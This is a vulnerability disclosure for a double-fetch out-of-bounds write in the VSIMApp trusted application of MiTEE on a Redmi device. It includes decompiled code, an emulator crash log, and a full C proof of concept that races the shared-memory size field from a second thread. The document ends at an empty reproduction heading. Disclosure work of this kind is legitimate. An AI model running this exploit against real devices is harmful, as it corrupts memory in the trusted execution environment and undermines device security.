
We found an out-of-bound write of TA (UUID: 3d08821c-33a6-11e6-a1fa089e01c83aa2, AppName: VSIMApp) of MiTEE, triggered by double fetches.


## Device Information

The build fingerprint of the device is `Redmi/iron_eea_global/iron:14/UP1A.231005.007/V816.0.18.0.UNQEUXM:user/release-keys`

The sha1 of the TA is `0e0d57e8ffef6746125a37e888d214fb3b7421f9`

## Detailed Vulnerability Analysis

`TA_InvokeCommandEntryPoint` is the attack entry point, which can be directly triggered by an attacker acting as a TEE client through `TEEC_InvokeCommand`.

This vulnerability firstly requires setting the second argument of `TA_InvokeCommandEntryPoint` (`comm_id`) to 0x2000 or 0x2002, while controlling `uint32_t param_types` to `TEEC_MEMREF_*` (i.e., `(TEEC_MEMREF_TEMP_INPUT) | ((TEEC_MEMREF_TEMP_OUTPUT) << 4)=0x65`). Then `TEE_Param *params` of `TA_InvokeCommandEntryPoint` are transmitted through shared memory between the normal world and the TEE environment.


```C
1  uint TA_InvokeCommandEntryPoint(undefined8 param_1,uint comm_id,uint param_types,undefined8 *params)

2  {
3    uint uVar1;
4    uint *mem_area1;
5    uint *mem_area2;
6
7    printf("[%s:%s][%s:%d]==func enter==\n","VSIMApp",&DAT_00102d0c,"TA_InvokeCommandEntryPoint",0x35);
8    printf("[%s:%s][%s:%d]cmd %08x\n","VSIMApp",&DAT_00102d0c,"TA_InvokeCommandEntryPoint",0x36,
9           (ulong)comm_id);
10    if (((param_types == 0x65) && (*(int *)(params + 1) == 0x608)) && (*(int *)(params + 3) == 0x608)) {
11      mem_area1 = (uint *)*params;
12      if (*mem_area1 == 1) {
13        mem_area2 = (uint *)params[2];
14                      /* check of size  */
15        if ((mem_area1[1] < 0x601) && (mem_area2[1] < 0x601)) {   // first fetch
16          uVar1 = 0xfffe0004;
17          if ((int)comm_id < 0x2000) {
18            // ...
19          }
20          else if (comm_id == 0x2000) {
21                      /* buggy */
22            uVar1 = FUN_comm_0x2000(mem_area1,mem_area2);
23          }
24          else if (comm_id == 0x2001) {
25            uVar1 = FUN_00120550(mem_area1,mem_area2);
26          }
27          else if (comm_id == 0x2002) {
28            uVar1 = enroll_export(mem_area1,mem_area2);
29          }
30        }
31      /*...*/
32  }
```

Note that we need to pass the checks at line 10 and line 15. Therefore, we create two buffers for `params`, named `mem_area1` (`params[0].buffer`) and `mem_area2` (`params[1].buffer`), as shown in the code above, and set the size of both buffers to 0x608. 
Specifically, we set `*(int *)(params + 1)` (i.e., `params[0].size`) and `*(int *)(params + 3)` (i.e., `params[1].size`) to 0x608.


```c
typedef union
{
	struct
	{
		void* buffer; size_t size;
	} memref;
	
	struct
	{
		uint32_t a;
		uint32_t b;
	} value;
} TEE_Param;
```

Inside these buffers, we place a size-like integer value at offset 4 (e.g., 0x400) that is less than `0x601`, thereby satisfying the condition at line 15.

Up to this point, these memory accesses correspond to the first fetch from the shared memory `params`.


Using `comm_id = 0x2000` as an example, the second fetch occurs at line 18 in `FUN_comm_0x2000`. After the first fetch of `mem_area2[1]` (initially set to 0x400), the attacker races its value to `0x100000`. As a result, the subsequent `memset()` call performs an overflow write because the second fetch to `(mem_area2 + 4)` exceeds the size of the allocated shared memory.

```C
1  undefined8 FUN_comm_0x2000(undefined8 param_1,long mem_area2)
2  {
3    long lVar1;
4    long *plVar2;
5    long lVar3;
6    long lVar4;
7
8    lVar1 = tpidr_el0;
9    plVar2 = (long *)(lVar1 + -8);
10    lVar3 = *plVar2;
11    lVar4 = *(long *)(lVar1 + -0x10);
12    *plVar2 = lVar3 + -0x10;
13    *(long *)(lVar3 + -8) = lVar4;
14    lVar1 = FUN_00122160("enroll_key");
15    *(uint *)(lVar3 + -0xc) = (uint)(lVar1 != 0);
16    FUN_00121cd8();
17                      /* crash here */
18    memset(mem_area2 + 8,0,*(undefined4 *)(mem_area2 + 4)); // second fetch
19    *(undefined4 *)(mem_area2 + 4) = 4;
20    memmove(mem_area2 + 8,lVar3 + -0xc,4);
21  }
```

In conclusion, an attacker in the normal world can exploit a double-fetch vulnerability to bypass parameter validation. By modifying the parameters between the two fetches, the attacker can further tamper with the size variable used in a `memset()` call, eventually causing an out-of-bounds write on the Trusted Application (TA) running inside the TEE.

## Screenshots for Validity


```C
[=]     printf: [VSIMApp:INFO][TA_CreateEntryPoint:16]==func enter==
[=]     printf: [VSIMApp:INFO][TA_CreateEntryPoint:18]==func exit==
[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:34]==func enter==
[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:36]==func exit==
[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:53]==func enter==
[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:54]cmd 00002000
[=]     TEE_OpenPersistentObject:
[=]             objectID b'enroll_key'
[=]             file name: ./emulate/files/2147483648/enroll_key
[=]             ret 0xffff0008
[=]     printf: [VSIMApp:ERROR][load_rsa_from_file:204]key enroll_key does not exists or empty

[=]     memset 0x100000 bytes of 0x0 fill to 0xbbbbf008
[x]     =================[lr: 0x555555574d54] [memset] memory corruption detected!!
[x]     CPU Context:
[x]     x0      : 0xbbbbf008
[x]     x1      : 0x0
[x]     x2      : 0x100000
[x]     x3      : 0x555555556f66
[x]     x4      : 0xcc
[x]     x5      : 0x5555555565fc
[x]     x6      : 0x400
[x]     x7      : 0x0
[x]     x8      : 0x0
[x]     x9      : 0x0
[x]     x10     : 0x0
[x]     x11     : 0x0
[x]     x12     : 0x0
[x]     x13     : 0x0
[x]     x14     : 0x0
[x]     x15     : 0x0
[x]     x16     : 0x5555555b2458
[x]     x17     : 0x99999018
[x]     x18     : 0x0
[x]     x19     : 0xbbbbf000
[x]     x20     : 0xf0ffe4
[x]     x21     : 0xbbbbf008
[x]     x22     : 0xeee008
[x]     x23     : 0xf0fff0
[x]     x24     : 0xcacacacacacacaca
[x]     x25     : 0x0
[x]     x26     : 0x0
[x]     x27     : 0x0
[x]     x28     : 0x0
[x]     x29     : 0x8000002dddc0
[x]     x30     : 0x555555574d54
[x]     sp      : 0x8000002ddd90
[x]     pc      : 0xdeadbeef
[x]     lr      : 0x555555574d54
[x]     PC = 0x00000000deadbeef (unreachable)

[x]     Memory map:
[x]     Start            End              Perm    Label                                    Image
[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls
[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack
[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_0
[x]     000000bbbbf000 - 000000bbbc0000   rw-     shared_memory_1
[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
[x]     00555555554000 - 00555555573000   r--     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
[x]     00555555573000 - 005555555af000   r-x     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
[x]     005555555af000 - 005555555be000   rw-     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffffffde000 - 008000002de000   rwx     [stack]
```


### Source code of the POC


```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "tee_client_api.h"
#include "repro.h"
#include "tee.h"
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>  

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
typedef TEEC_Result (*teec_pre_process_operation_impl_t)(TEEC_Context* ctx,
            TEEC_Operation* operation,
            struct tee_ioctl_param* params,
            TEEC_SharedMemory* shms);

#define teec_pre_process_operation_offset 0x2434

uintptr_t get_lib_base(const char *libname) {
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        perror("fopen");
        return 0;
    }

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, libname)) {
            uintptr_t base = 0;
            // The address range looks like "7f9a2c0000-7f9a2e0000 ..."
            if (sscanf(line, "%lx-%*lx", &base) == 1) {
                fclose(fp);
                return base;
            }
        }
    }

    fclose(fp);
    return 0;
}



#define CMD 0x2000 

typedef struct my_struct{
    int mustbeone;
    int size;
} my_struct;

void* mod_thread(void* arg){
    my_struct* wow = (my_struct*)arg;
    while(1){
        wow->size = 0x400;
        wow->size = 0x100000; 
    }
}

void setup_mem(my_struct* m1, my_struct* m2){
    m1->mustbeone = 1;
    m1->size = 0x400;
    m2->mustbeone = 1;
    m2->size = 0x400;
}

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    pthread_t tid;

    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);
    
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    
    op.params[0].tmpref.buffer = mem_area1; 
    op.params[0].tmpref.size = 0x608; 
    op.params[1].tmpref.buffer = mem_area2;
    op.params[1].tmpref.size = 0x608; 
    setup_mem(mem_area1, mem_area2);  
   
    #define TEEC_CONFIG_PAYLOAD_REF_COUNT 4
    uint64_t buf[(sizeof(struct tee_ioctl_invoke_arg) +
            TEEC_CONFIG_PAYLOAD_REF_COUNT *
                sizeof(struct tee_ioctl_param)) /
            sizeof(uint64_t)] = { 0 };
    struct tee_ioctl_buf_data buf_data;
    struct tee_ioctl_invoke_arg *arg;
    struct tee_ioctl_param *params;
    TEEC_Result res;
    uint32_t eorig;
    TEEC_SharedMemory shm[TEEC_CONFIG_PAYLOAD_REF_COUNT];
    int rc;
    buf_data.buf_ptr = (uintptr_t)buf;
    buf_data.buf_len = sizeof(buf);

    arg = (struct tee_ioctl_invoke_arg *)buf;
    arg->num_params = TEEC_CONFIG_PAYLOAD_REF_COUNT;
    params = (struct tee_ioctl_param *)(arg + 1);

    arg->session = session->session_id;
    arg->func = CMD;
    
    op.session = session;
   
	teec_pre_process_operation_impl_t teec_pre_process_operation_impl =
        (teec_pre_process_operation_impl_t)((uint8_t*)get_lib_base("libteecli.so") + teec_pre_process_operation_offset);			
 
    res = teec_pre_process_operation_impl(session->ctx, &op, params, shm);
    if (res != TEEC_SUCCESS) {
        printf("teec_pre_process_operation failed!! %x\n", res);
        exit(-1);
    }

	mem_area2 = shm[1].buffer;
    setup_mem(mem_area1, mem_area2);  
    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
        perror("pthread_create failed");
        return;
    }

    rc = ioctl(session->ctx->fd, TEE_IOC_INVOKE, &buf_data);
    res = arg->ret;
    err_origin = arg->ret_origin; 

    printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
}


int main(int argc, char **argv)
{
    char* ta = "3d08821c-33a6-11e6-a1fa089e01c83aa2";
    TEEC_UUID *uuid = teegris_uuid(ta);

    TEEC_Context context;
    TEEC_Session session;
    uint32_t err_origin;
    TEEC_Result res;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    printf("[+] sending query...\n");
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
```


For reference, the dependent files for the PoC are attached here.
- `tee_client_api.h`: Open-sourced in the OPTEE repo
- `tee.h`: Open-sourced in the OPTEE repo
- `repro.h`: Contains basic utilities specific to this PoC, primarily handling parameter initialization, TEE Client API invocation, and character-related operations.
- `libteecli.so`: Can be found at the device path ./vendor/lib64/libteecli.so.


### Vulnerability Reproduction